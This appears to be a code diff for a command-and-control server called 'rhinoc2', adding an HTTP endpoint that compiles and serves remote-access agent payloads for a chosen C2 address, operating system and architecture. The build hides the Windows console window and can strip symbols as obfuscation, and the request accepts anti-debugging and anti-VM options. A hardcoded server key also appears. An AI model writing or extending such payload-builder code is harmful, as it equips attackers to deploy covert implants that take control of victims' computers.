@@ -1,11 +1,16 @@
 package main
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"rhinoc2/pkg/crypto"
 	"sync"
 	"time"
@@ -471,6 +476,116 @@ func (s *Server) serveStatic(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filePath)
 }
 
+func (s *Server) handleBuild(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	var buildReq struct {
+		C2Address string `json:"c2_address"`
+		OS        string `json:"os"`
+		Arch      string `json:"arch"`
+		Format    string `json:"format"`
+		Obfuscate bool   `json:"obfuscate"`
+		AntiDebug bool   `json:"anti_debug"`
+		AntiVM    bool   `json:"anti_vm"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&buildReq); err != nil {
+		http.Error(w, "Invalid request", http.StatusBadRequest)
+		return
+	}
+
+	if buildReq.C2Address == "" {
+		buildReq.C2Address = "ws://localhost:8443/api/agent"
+	}
+	if buildReq.OS == "" {
+		buildReq.OS = "windows"
+	}
+	if buildReq.Arch == "" {
+		buildReq.Arch = "amd64"
+	}
+	if buildReq.Format == "" {
+		buildReq.Format = "exe"
+	}
+
+	log.Printf("Building payload: %s/%s (%s) for %s", buildReq.OS, buildReq.Arch, buildReq.Format, buildReq.C2Address)
+
+	payload, filename, err := s.buildPayload(buildReq.C2Address, buildReq.OS, buildReq.Arch, buildReq.Format, buildReq.Obfuscate, buildReq.AntiDebug, buildReq.AntiVM)
+	if err != nil {
+		log.Printf("Build failed: %v", err)
+		http.Error(w, fmt.Sprintf("Build failed: %v", err), http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
+	w.Write(payload)
+
+	log.Printf("Payload built successfully: %s (%d bytes)", filename, len(payload))
+}
+
+func (s *Server) buildPayload(c2Address, goos, goarch, format string, obfuscate, antiDebug, antiVM bool) ([]byte, string, error) {
+	_ = rand.Reader
+	_ = hex.EncodeToString
+
+	// Use the real agent with all functionality
+	agentDir, err := filepath.Abs("agent")
+	if err != nil {
+		return nil, "", fmt.Errorf("failed to get agent path: %v", err)
+	}
+
+	agentFile := filepath.Join(agentDir, "agent.go")
+	if _, err := os.Stat(agentFile); os.IsNotExist(err) {
+		return nil, "", fmt.Errorf("agent.go not found at %s", agentFile)
+	}
+
+	ext := ""
+	if goos == "windows" {
+		ext = ".exe"
+	}
+	outputName := fmt.Sprintf("agent_%s_%s%s", goos, goarch, ext)
+
+	tmpDir, err := ioutil.TempDir("", "rhinoc2-build-*")
+	if err != nil {
+		return nil, "", fmt.Errorf("failed to create temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	outputPath := filepath.Join(tmpDir, outputName)
+
+	buildFlags := []string{"build"}
+	if obfuscate {
+		buildFlags = append(buildFlags, "-ldflags", "-s -w -H=windowsgui")
+	} else {
+		buildFlags = append(buildFlags, "-ldflags", "-H=windowsgui")
+	}
+	buildFlags = append(buildFlags, "-o", outputPath, agentFile)
+
+	cmd := exec.Command("go", buildFlags...)
+	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return nil, "", fmt.Errorf("build failed: %v\n%s", err, string(output))
+	}
+
+	payload, err := ioutil.ReadFile(outputPath)
+	if err != nil {
+		return nil, "", fmt.Errorf("failed to read payload: %v", err)
+	}
+
+	if format == "shellcode" {
+		return nil, "", fmt.Errorf("shellcode format not yet implemented")
+	} else if format == "dll" {
+		return nil, "", fmt.Errorf("dll format not yet implemented")
+	}
+
+	return payload, outputName, nil
+}
+
 func main() {
 	key := "RhinoC2SecretKey2024"
 	srv := NewServer(key)
@@ -479,6 +594,7 @@ func main() {
 	r.HandleFunc("/api/agent", srv.handleAgent)
 	r.HandleFunc("/api/operator", srv.handleOperator)
 	r.HandleFunc("/api/agents", srv.handleRESTAPI).Methods("GET")
+	r.HandleFunc("/api/build", srv.handleBuild).Methods("POST")
 	r.HandleFunc("/panel.html", srv.serveStatic)
 	r.HandleFunc("/index.html", srv.serveStatic)
 	r.HandleFunc("/", srv.serveStatic)
